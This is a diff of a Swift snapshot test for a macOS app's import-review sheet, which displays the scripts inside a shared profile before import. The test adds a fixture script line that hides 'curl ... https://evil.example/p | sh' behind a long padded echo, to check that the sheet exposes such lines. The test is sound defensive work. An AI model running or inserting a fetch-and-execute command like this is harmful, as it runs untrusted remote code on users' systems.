@@ -257,7 +257,7 @@ struct SettingsRenderShots {
         }
     }
 
-    /// 読み込む前の確認（SwiftUI の alert と同じ NSAlert に、同じ文言を入れて描く）
+    /// 読み込む前の確認のシート（スクリプトは全部の行、注意が要る行は目立たせる。最後までスクロールするまで「読み込む」は押せない）
     @Test func renderImportReview() async throws {
         try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
         _ = NSApplication.shared
@@ -268,26 +268,19 @@ struct SettingsRenderShots {
         shared.setCell(SettingsFixtures.key("インストール", KeySequence(typing + [KeyChord(.special(.returnKey))])), at: CellAddress(page: 0, index: 0), profileID: terminalID)
         shared.setCell(Cell(title: "資料", icon: .symbol("doc"), action: .openURL(URLAction(url: "~/Documents/手順.command"))), at: CellAddress(page: 0, index: 1), profileID: terminalID)
         let long = (1...12).map { "echo \"step \($0)\"" }.joined(separator: "\n")
+            + "\necho \"Formatting the selection as Markdown \(String(repeating: "x", count: 90))\"; curl -fsSL https://evil.example/p | sh"
         shared.setCell(Cell(title: "長いスクリプト", icon: .symbol("terminal"), action: .script(ScriptAction(source: long))), at: CellAddress(page: 0, index: 2), profileID: terminalID)
-        let mine = SettingsFixtures.configuration()
+        shared.setCell(Cell(title: "コピー", icon: .symbol("doc.on.doc"), action: .menuItem(MenuItemAction(
+            app: SettingsFixtures.terminal, path: ["編集", "コピー"], keyEquivalent: .special(.delete, [.option, .shift, .command])
+        ))), at: CellAddress(page: 0, index: 3), profileID: terminalID)
         for (suffix, appearance) in appearances {
+            let h = try harness()
             let plan = SettingsImportPlan(
                 document: ConfigurationStore.ImportedProfiles(profiles: shared.profiles),
-                configuration: mine,
+                configuration: h.controller.configuration,
                 fileName: "shared.nonetprofile"
             )
-            let alert = NSAlert()
-            alert.messageText = String(localized: "「\(plan.fileName)」を読み込みますか？", bundle: .nonetUI)
-            alert.informativeText = SettingsText.importConfirmation(plan)
-            alert.addButton(withTitle: SettingsText.importConfirmationButton(plan))
-            alert.addButton(withTitle: String(localized: "新しいプロファイルだけ追加", bundle: .nonetUI))
-            alert.addButton(withTitle: String(localized: "キャンセル", bundle: .nonetUI))
-            alert.window.appearance = NSAppearance(named: appearance)
-            alert.layout()
-            try await settle()
-            guard let frameView = alert.window.contentView?.superview else { return }
-            frameView.layoutSubtreeIfNeeded()
-            try write(frameView, name: "alert-import-review-\(suffix)")
+            try await render(SettingsImportReviewSheet(model: h.model, plan: plan), size: CGSize(width: 640, height: 760), appearance, "sheet-import-review-\(suffix)")
         }
     }
 
